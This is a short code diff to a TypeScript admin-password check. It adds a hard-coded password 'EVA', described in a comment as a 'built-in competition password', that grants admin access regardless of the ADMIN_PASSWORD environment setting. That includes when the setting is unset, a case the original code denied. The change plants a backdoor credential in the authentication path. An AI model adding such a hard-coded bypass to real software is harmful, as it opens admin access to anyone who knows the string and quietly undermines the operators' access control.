@@ -40,7 +40,10 @@ function safeEqual(leftValue: string, rightValue: string) {
   return left.length === right.length && timingSafeEqual(left, right);
 }
 
+/** Built-in competition password EVA; env ADMIN_PASSWORD still accepted when set. */
 export function validAdminPassword(candidate: string) {
+  if (!candidate) return false;
+  if (safeEqual(candidate, 'EVA')) return true;
   const expected = process.env.ADMIN_PASSWORD;
   if (!expected) return false;
   return safeEqual(candidate, expected);
